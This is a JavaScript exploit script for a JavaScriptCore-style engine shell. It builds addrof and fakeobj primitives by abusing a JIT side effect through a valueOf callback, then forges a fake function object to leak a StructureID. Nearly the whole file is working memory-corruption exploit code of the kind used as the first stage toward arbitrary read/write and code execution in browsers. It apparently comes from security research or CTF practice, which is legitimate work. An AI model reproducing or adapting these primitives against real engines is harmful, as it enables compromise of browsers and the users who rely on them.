load("toolkit.js");

function leakStructureId(target){
	// address leak
	function addrof(obj){
		var arr = [1.1, 2.2, 3.3];
		arr['a'] = 1;
		function jitme(a, c) {
				a[1] = 2.2;
				c == 1; // side effects
			return a[0];
		}
		for(var i = 0; i < 100000; i++){
			jitme(arr, {}); // JITting...
		}
		let addr = Int64.fromDouble(jitme(arr, {valueOf: function(){ arr[0] = obj; return '1';}}));
		return addr;
	}

	// fakeobj
	function fakeobj(addr){
		var arr = [1.1, 2.2, 3.3];
		arr['a'] = 1;
		function jitme(a, c) {
			a[0] = 1.1;
			a[1] = 2.2;
			c == 1;
			a[2] = addr.asDouble();
		}
		for(var i = 0; i < 100000; i++){
				jitme(arr, {}); // JITting...
		}
		jitme(arr, {valueOf: function(){ arr[0] = {}; return '1';}})
		return arr[2];
	}

    var unlinked_function = {
        a:(new Int64("0xF0000000")).asDouble(),
        //a:(new Int64("0xDFFFFFFF")).asDouble(),
        dummy1: 1,
        dummy2: 2,
        dummy3: 3,
        dummy4: 4,
        dummy5: 5,
        dummy6: 6,
        identifier: {},
    };
    
    var fake_function = {
        dummy1: 1,
        dummy2: 2,
        dummy3: 3,
        dummy4: 4,
        dummy5: 5,
        dummy6: 6,
        dummy7: 7,
        dummy8: 8,
        dummy9: 9,
        executable: unlinked_function,
    };
    
    var container = {
        jscell: (new Int64('0x00001a0000000000')).asDouble(), // dummy function jscell
        butterfly: {},
        dummy: 1337,
        functionExecutable: fake_function,
    };
    
    var container_addr = addrof(container);    
    let fakeaddr = Int64.add(container_addr, 0x10);
    let fake_object = fakeobj(fakeaddr);

    //print(typeof(unlinked_function))
    //print(describe(target))
    //print(describe(container))
    //print(describe(fake_function))
    //print(describe(unlinked_function))
    
    unlinked_function.identifier = fake_object; // set fake_object to identifier
    container.butterfly = target; // target objects
    readline();
    
    print(Function.prototype.toString.call(fake_object))
    readline();
    var leaked_id = Function.prototype.toString.call(fake_object); // boom!
    return leaked_id.charCodeAt(10).toString(16) + leaked_id.charCodeAt(9).toString(16);
}


function main(){
    let x = {x: 0x1337};
    let leaked_id = leakStructureId(x);
    print("[+] Leaked:", leaked_id);

    readline();
}

main();
